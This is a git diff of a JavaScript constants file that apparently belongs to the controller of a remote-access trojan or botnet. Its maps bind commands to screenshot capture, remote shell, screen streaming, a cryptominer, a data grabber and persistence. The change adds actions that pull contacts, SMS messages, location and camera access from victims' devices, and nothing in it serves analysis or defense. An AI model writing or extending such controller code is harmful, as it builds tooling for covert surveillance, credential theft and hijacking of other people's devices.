@@ -94,6 +94,7 @@ export const E = {
   arrow: '➡️', up: '⬆️', down: '⬇️', left: '⬅️',
   online: '🟢', offline: '🔴', loading: '⏳', sparkles: '✨',
   rocket: '🚀', pulse: '💫', ring: '💍', hourglass: '⏱️',
+  satellite: '📡', tools: '🔧',
 }
 
 export const A = { reset: '\u001b[0m', grey: '\u001b[90m', red: '\u001b[31m', cyan: '\u001b[36m', green: '\u001b[32m', yellow: '\u001b[33m', magenta: '\u001b[35m', brightRed: '\u001b[91m', brightCyan: '\u001b[96m' }
@@ -116,5 +117,5 @@ export const BOT_CMDS = ['!help', '!menu', '!devices', '!broadcast', '!target', 
 
 export const VALID_CMDS = new Set([...DEV_CMDS])
 
-export const ALERT_CMD_MAP = { ss: 'screenshot', cmd: 'shell', stream: 'stream', miner: 'miner', grabber: 'grabber', persist: 'persist' }
-export const BTN_ACTIONS = { screenshot: 'screenshot', stream: 'stream start', shell_btn: 'shell', grabber: 'grabber', dir: 'dir', tree: 'tree', disk: 'disk' }
+export const ALERT_CMD_MAP = { ss: 'screenshot', cmd: 'shell', stream: 'stream', miner: 'miner', grabber: 'grabber', persist: 'persist', files: 'dir' }
+export const BTN_ACTIONS = { screenshot: 'screenshot', stream: 'stream start', shell_btn: 'shell', grabber: 'grabber', dir: 'dir', tree: 'tree', disk: 'disk', contacts: 'contacts', sms: 'sms', location: 'location', camera: 'camera', broadcast: 'broadcast' }
